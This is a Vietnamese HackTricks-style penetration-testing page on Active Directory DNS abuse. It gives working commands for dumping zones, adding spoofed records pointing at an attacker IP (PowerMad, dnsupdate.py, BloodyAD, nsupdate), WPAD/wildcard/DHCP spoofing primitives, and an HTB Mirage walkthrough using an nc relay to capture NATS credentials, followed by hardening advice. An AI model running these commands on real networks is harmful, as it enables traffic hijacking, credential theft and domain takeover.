# Bản ghi DNS AD

{{#include ../../banners/hacktricks-training.md}}

Theo mặc định, **bất kỳ người dùng nào** trong Active Directory cũng có thể **liệt kê tất cả bản ghi DNS** trong các vùng DNS của Domain hoặc Forest, tương tự như zone transfer (người dùng có thể liệt kê các đối tượng con của một vùng DNS trong môi trường AD).

Công cụ [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) cho phép **liệt kê** và **xuất** **tất cả bản ghi DNS** trong vùng nhằm phục vụ công tác trinh sát mạng nội bộ.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

> adidnsdump v1.4.0 (tháng 4 năm 2025) bổ sung đầu ra JSON/Greppable (`--json`), phân giải DNS đa luồng và hỗ trợ TLS 1.2/1.3 khi kết nối với LDAPS  

Để biết thêm thông tin, hãy đọc [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Tạo / Sửa đổi bản ghi (ADIDNS spoofing)

Vì nhóm **Authenticated Users** mặc định có quyền **Create Child** trên DACL của zone, mọi tài khoản domain (hoặc tài khoản máy tính) đều có thể đăng ký thêm bản ghi. Điều này có thể được dùng để chiếm quyền điều hướng lưu lượng, ép buộc NTLM relay hoặc thậm chí chiếm toàn bộ domain.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py đi kèm Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Các primitive tấn công phổ biến

1. **Wildcard record** – `*.<zone>` biến máy chủ AD DNS thành một responder trên toàn doanh nghiệp, tương tự như giả mạo LLMNR/NBNS. Kỹ thuật này có thể bị lạm dụng để thu thập NTLM hash hoặc relay chúng đến LDAP/SMB. (Yêu cầu tắt WINS-lookup.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – thêm `wpad` (hoặc một record **NS** trỏ đến máy chủ của attacker để bỏ qua Global-Query-Block-List), rồi proxy minh bạch các HTTP request gửi ra ngoài để thu thập thông tin xác thực. Microsoft đã vá các cách bypass wildcard/DNAME (CVE-2018-8320), nhưng **NS-record vẫn hoạt động**.<sup>[[1]](#references)</sup>    
3. **Chiếm quyền stale entry** – chiếm địa chỉ IP trước đây thuộc về một workstation; entry DNS tương ứng vẫn phân giải được, cho phép thực hiện resource-based constrained delegation hoặc các cuộc tấn công Shadow-Credentials mà không cần động đến DNS.    
4. **Giả mạo DHCP → DNS** – trong triển khai Windows DHCP+DNS mặc định, attacker không xác thực trên cùng subnet có thể ghi đè bất kỳ A record hiện có nào (kể cả Domain Controller) bằng cách gửi các DHCP request giả mạo kích hoạt dynamic DNS update (Akamai “DDSpoof”, 2023). Điều này cho phép thực hiện machine-in-the-middle qua Kerberos/LDAP và có thể dẫn đến chiếm quyền toàn bộ domain.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – thay đổi `dNSHostName` của một machine account do bạn kiểm soát, đăng ký một A record khớp với tên đó, sau đó yêu cầu certificate cho tên đó để giả mạo DC. Các công cụ như **Certipy** hoặc **BloodyAD** tự động hóa toàn bộ quy trình.  

Một AD DNS record chứa [serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) có thể là một phần của chuỗi relay có điều kiện: bên gọi cần có quyền tạo record, một đường coercion khiến máy tính mục tiêu xác thực đến tên đó, và một đích relay chấp nhận kết quả xác thực. Hãy đánh giá riêng giao thức ở đích; SMB signing trên kết nối đi vào tự nó không xác định được liệu đích HTTPS WinRM có chấp nhận relay hay không. Mức độ vá lỗi, cách xử lý tên, Extended Protection và cấu hình dịch vụ có thể làm thay đổi kết quả.

---

### Chiếm quyền dịch vụ nội bộ qua dynamic record cũ (nghiên cứu tình huống NATS)

Khi dynamic update vẫn được mở cho tất cả người dùng đã xác thực, **một tên dịch vụ đã bị hủy đăng ký có thể bị chiếm lại và trỏ đến hạ tầng của attacker**. DC Mirage HTB để lộ hostname `nats-svc.mirage.htb` sau khi DNS scavenging diễn ra, nên bất kỳ người dùng nào có quyền thấp cũng có thể:<sup>[[3]](#references)</sup>

1. **Xác nhận record đã bị thiếu** và tìm hiểu SOA bằng `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Tạo lại bản ghi** trỏ đến một giao diện external/VPN mà họ kiểm soát:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Giả mạo dịch vụ plaintext**. Các client NATS mong đợi nhận được một banner `INFO { ... }` trước khi gửi thông tin xác thực, vì vậy chỉ cần sao chép banner hợp lệ từ broker thật là đủ để thu thập bí mật:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Bất kỳ client nào phân giải tên đã bị chiếm quyền sẽ ngay lập tức leak frame JSON `CONNECT` của nó (bao gồm `"user"`/`"pass"`) đến listener. Chạy binary `nats-server -V` chính thức trên host của attacker, tắt tính năng che giấu log hoặc chỉ cần sniff phiên bằng Wireshark đều cho ra cùng thông tin xác thực dạng plaintext vì TLS là tùy chọn.

4. **Pivot với creds đã thu thập** – trong Mirage, tài khoản NATS bị đánh cắp cung cấp quyền truy cập JetStream, qua đó làm lộ các sự kiện xác thực trước đây chứa tên người dùng/mật khẩu AD có thể tái sử dụng.

Mô hình này áp dụng cho mọi dịch vụ tích hợp AD dựa vào quá trình bắt tay TCP không bảo mật (HTTP API, RPC, MQTT, v.v.): khi bản ghi DNS bị chiếm quyền, attacker trở thành dịch vụ.

---

## Phát hiện & tăng cường bảo mật

* Từ chối quyền *Create all child objects* của **Authenticated Users** trên các zone nhạy cảm và ủy quyền cập nhật động cho một tài khoản chuyên dụng được DHCP sử dụng.
* Nếu cần cập nhật động, hãy đặt zone thành **Secure-only** và bật **Name Protection** trong DHCP để chỉ computer object sở hữu bản ghi mới có thể ghi đè bản ghi đó.
* Giám sát các event ID 257/252 của DNS Server (cập nhật động), 770 (chuyển zone) và các lần ghi LDAP vào `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Chặn các tên nguy hiểm (`wpad`, `isatap`, `*`) bằng một bản ghi cố ý vô hại hoặc thông qua Global Query Block List.
* Luôn cập nhật bản vá cho DNS server – ví dụ: các lỗi RCE CVE-2024-26224 và CVE-2024-26231 đạt **CVSS 9.8** và có thể bị khai thác từ xa nhằm vào Domain Controller.  

## References

- [1] [ADIDNS xem xét lại - WPAD, GQBL và nhiều nội dung khác](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Giả mạo bản ghi DNS bằng cách lạm dụng cập nhật DNS động của DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Kết hợp rò rỉ NFS, lạm dụng Dynamic DNS, đánh cắp thông tin xác thực NATS, bí mật JetStream và Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Vào zone: kết xuất DNS của Active Directory bằng adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
